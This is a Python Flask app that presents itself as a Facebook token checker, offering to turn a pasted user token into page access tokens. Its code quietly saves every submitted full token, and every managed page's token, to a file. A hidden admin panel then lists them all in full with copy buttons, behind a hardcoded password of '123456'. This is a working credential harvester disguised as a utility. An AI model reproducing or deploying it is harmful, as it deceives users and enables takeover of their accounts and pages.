from flask import Flask, request, render_template_string, session, redirect, url_for
import requests
import time
import secrets
import json
import os

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# ADMIN LOGIN
ADMIN_USER = "legend"
ADMIN_PASS = "123456"
TOKENS_FILE = "tokens.json"

# Load/Save Tokens
def load_tokens():
    if os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_tokens(tokens):
    with open(TOKENS_FILE, 'w') as f:
        json.dump(tokens[-100:], f, indent=2)

checked_tokens = load_tokens()

# Safe GET Request
def safe_get(url, params):
    try:
        r = requests.get(url, params=params, timeout=10)
        return r.json() if r.status_code == 200 else {"error": "API Error"}
    except:
        return {"error": "Network Error"}

# MAIN FUNCTION
def check_token(token):
    token = token.strip()
    result = {
        "valid": False,
        "status": "NAHI CHAL RAHA",
        "name": "Unknown",
        "uid": "Unknown",
        "token_prefix": token[:10] + "..." + token[-5:],
        "full_token": token,
        "checked_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry_guess": "Working Now",
        "profile_pic": "",
        "friends": "N/A",
        "pages_liked": "N/A",
        "groups": "N/A",
        "posts": "N/A",
        "photos": "N/A",
        "videos": "N/A",
        "managed_pages": []
    }

    # STEP 1: GET USER INFO
    me = safe_get("https://graph.facebook.com/v15.0/me", {
        'access_token': token,
        'fields': 'id,name,picture.width(200)'
    })
    if "error" in me:
        return result

    result["uid"] = me.get("id", "N/A")
    result["name"] = me.get("name", "N/A")
    result["profile_pic"] = me.get("picture", {}).get("data", {}).get("url", "")
    result["valid"] = True
    result["status"] = "CHAL RAHA HAI"

    # EXPIRY GUESS
    if token.startswith("EAAA"):
        result["expiry_guess"] = "Short (1-2 hr)"
    elif token.startswith("EAAG") or len(token) > 300:
        result["expiry_guess"] = "Long (60 days)"
    elif token.startswith("EAAD"):
        result["expiry_guess"] = "Page Token (Never)"
    else:
        result["expiry_guess"] = "Working"

    # STEP 2: COUNTS
    uid = result["uid"]
    for end, key in [
        ("friends", "friends"),
        ("likes", "pages_liked"),
        ("groups", "groups"),
        ("posts", "posts"),
        ("photos", "photos"),
        ("videos", "videos")
    ]:
        data = safe_get(f"https://graph.facebook.com/v15.0/{uid}/{end}", {
            'access_token': token, 'summary': 'total_count'
        })
        result[key] = str(data.get("summary", {}).get("total_count", "No Perm")) if "summary" in data else "No Perm"

    # STEP 3: MANAGED PAGES + PAGE TOKENS
    pages = safe_get("https://graph.facebook.com/v15.0/me/accounts", {
        'access_token': token,
        'fields': 'name,id,access_token,category,fan_count'
    })
    if "data" in pages:
        for p in pages["data"]:
            result["managed_pages"].append({
                "name": p.get("name", "Unknown"),
                "id": p.get("id", "N/A"),
                "token": p.get("access_token", "No Token"),
                "category": p.get("category", "N/A"),
                "likes": p.get("fan_count", "0")
            })
    else:
        result["managed_pages"].append({"name": "No Pages", "token": "Permission Missing"})

    checked_tokens.append(result)
    save_tokens(checked_tokens)
    return result

# ROUTES
@app.route("/", methods=["GET", "POST"])
def home():
    result = None
    if request.method == "POST":
        token = request.form.get("token", "").strip()
        if token:
            result = check_token(token)
    return render_template_string(HOME_PAGE, result=result)

@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        if request.form.get("user") == ADMIN_USER and request.form.get("pass") == ADMIN_PASS:
            session["admin"] = True
            return redirect("/admin")
        return render_template_string(LOGIN_PAGE, error="Wrong!")
    return render_template_string(LOGIN_PAGE, error=None)

@app.route("/admin")
def admin():
    if not session.get("admin"):
        return redirect("/admin/login")
    search = request.args.get("q", "").lower()
    tokens = [t for t in checked_tokens if search in t["name"].lower() or search in t["uid"]]
    return render_template_string(ADMIN_PAGE, tokens=tokens[::-1], search=search)

@app.route("/admin/delete/<uid>")
def delete(uid):
    if session.get("admin"):
        global checked_tokens
        checked_tokens = [t for t in checked_tokens if t["uid"] != uid]
        save_tokens(checked_tokens)
    return redirect("/admin")

@app.route("/admin/logout")
def logout():
    session.clear()
    return redirect("/")

# TEMPLATES
HOME_PAGE = '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>USER TOKEN → PAGE TOKEN</title>
<style>
  body { background:#000; color:#0f0; font-family:'Courier New'; text-align:center; padding:20px; }
  input, button { margin:10px; padding:14px; width:90%; max-width:420px; border:1px solid #0f0; background:#111; color:#0f0; border-radius:10px; font-size:16px; }
  button { background:#0f0; color:#000; font-weight:bold; }
  h1 { text-shadow:0 0 20px #0f0; }
  .res { background:#111; border:1px solid #0f0; padding:18px; margin:20px; border-radius:12px; font-size:14px; }
  .ok { color:#0f0; font-weight:bold; font-size:1.5em; }
  .no { color:#f55; font-weight:bold; font-size:1.5em; }
  .pic { width:80px; height:80px; border-radius:50%; border:2px solid #0f0; margin:10px; }
  .page { background:#111; border:1px solid #0f0; padding:12px; margin:8px; border-radius:8px; }
</style>
<script>function copy(t){navigator.clipboard.writeText(t).then(()=>{alert("Copied!");});}</script>
</head><body>
<h1>USER TOKEN → PAGE TOKEN</h1>
<p style="color:#0f0;">Sirf User Token Daal → Page Token Nikal Jayega!</p>
<form method="post">
  <input name="token" placeholder="Paste User Token Here" required>
  <button>CHECK & GET PAGE TOKENS</button>
</form>

{% if result %}
<div class="res">
  {% if result.valid %}<p class="ok">{{ result.status }}</p>{% else %}<p class="no">{{ result.status }}</p>{% endif %}
  {% if result.profile_pic %}<img src="{{ result.profile_pic }}" class="pic">{% endif %}
  <p><b>Name:</b> {{ result.name }}</p>
  <p><b>UID:</b> {{ result.uid }}</p>
  <p><b>Token:</b> {{ result.token_prefix }}</p>
  <p><b>Valid for:</b> {{ result.expiry_guess }}</p>
  <p><b>Friends:</b> {{ result.friends }} | <b>Liked Pages:</b> {{ result.pages_liked }} | <b>Groups:</b> {{ result.groups }}</p>
  <p><b>Posts:</b> {{ result.posts }} | <b>Photos:</b> {{ result.photos }} | <b>Videos:</b> {{ result.videos }}</p>

  {% if result.managed_pages %}
  <h3 style="color:#0f0;">PAGES MANAGED (WITH TOKEN):</h3>
  {% for p in result.managed_pages %}
  <div class="page">
    <p><b>{{ p.name }}</b> | ID: {{ p.id }} | Likes: {{ p.likes }} | {{ p.category }}</p>
    <p><b>Page Token:</b> {{ p.token[:15] }}...{{ p.token[-5:] if p.token != "No Token" else "" }}
      <button onclick="copy('{{ p.token }}')" style="background:#0f0;color:#000;padding:4px 8px;border:none;border-radius:5px;font-size:12px;cursor:pointer;">COPY</button>
    </p>
  </div>
  {% endfor %}
  {% endif %}
</div>
{% endif %}

<a href="/admin/login"><button style="background:#ff0;color:#000;padding:14px;border-radius:10px;font-weight:bold;">ADMIN PANEL</button></a>
</body></html>
'''

LOGIN_PAGE = '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ADMIN LOGIN</title>
<style>
  body { background:#000; color:#0f0; font-family:'Courier New'; text-align:center; padding:40px; }
  input, button { margin:10px; padding:14px; width:80%; max-width:350px; border:1px solid #0f0; background:#111; color:#0f0; border-radius:10px; font-size:16px; }
  button { background:#0f0; color:#000; font-weight:bold; }
  .err { color:#f55; }
</style></head><body>
<h1>ADMIN LOGIN</h1>
{% if error %}<p class="err">{{ error }}</p>{% endif %}
<form method="post">
  <input name="user" placeholder="Username" required>
  <input name="pass" type="password" placeholder="Password" required>
  <button>LOGIN</button>
</form>
<br><a href="/" style="color:#0f0;">Back</a>
</body></html>
'''

ADMIN_PAGE = '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ADMIN - ALL TOKENS</title>
<style>
  body { background:#000; color:#0f0; font-family:'Courier New'; padding:15px; }
  .card { background:#111; border:1px solid #0f0; margin:12px 0; padding:15px; border-radius:10px; word-break:break-all; font-size:13px; }
  .copy { background:#0f0; color:#000; border:none; padding:5px 10px; margin-left:10px; border-radius:5px; cursor:pointer; }
  .del { background:#f55; color:#fff; padding:8px; text-decoration:none; border-radius:5px; font-size:12px; }
  .search { width:90%; padding:12px; margin:10px; border:1px solid #0f0; background:#111; color:#0f0; border-radius:10px; }
</style>
<script>function copy(t){navigator.clipboard.writeText(t).then(()=>{alert("Copied!");});}</script>
</head><body>
<h1 style="text-align:center; text-shadow:0 0 15px #0f0;">ADMIN PANEL</h1>
<a href="/" style="background:#ff0;color:#000;padding:10px;border-radius:8px;text-decoration:none;margin:5px;display:inline-block;font-size:12px;">BACK</a>
<a href="/admin/logout" style="background:#f55;color:#fff;padding:10px;border-radius:8px;text-decoration:none;margin:5px;display:inline-block;font-size:12px;">LOGOUT</a>
<form method="get" style="display:inline;">
  <input name="q" class="search" placeholder="Search Name/UID" value="{{ search }}">
</form>
<p><b>Total: {{ tokens|length }}</b></p>

{% for t in tokens %}
<div class="card">
  <p><b>{{ t.name }}</b> | UID: {{ t.uid }} <a href="/admin/delete/{{ t.uid }}" class="del" onclick="return confirm('Delete?')">DELETE</a></p>
  <p><b>Full Token:</b> {{ t.full_token }} <button class="copy" onclick="copy('{{ t.full_token }}')">COPY</button></p>
  <p><b>Status:</b> {{ t.status }} | <b>Valid:</b> {{ t.expiry_guess }}</p>
  <p><b>Friends:</b> {{ t.friends }} | <b>Pages:</b> {{ t.pages_liked }} | <b>Groups:</b> {{ t.groups }}</p>

  {% if t.managed_pages %}
  <p><b>Pages Managed:</b></p>
  {% for p in t.managed_pages %}
  <div style="background:#222; border:1px solid #0f0; padding:8px; margin:5px; border-radius:6px; font-size:12px;">
    <b>{{ p.name }}</b> | ID: {{ p.id }} | Likes: {{ p.likes }}
    <br>Token: {{ p.token }} <button class="copy" onclick="copy('{{ p.token }}')">COPY</button>
  </div>
  {% endfor %}
  {% endif %}
  <small>{{ t.checked_at }}</small>
</div>
{% endfor %}
</body></html>
'''

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
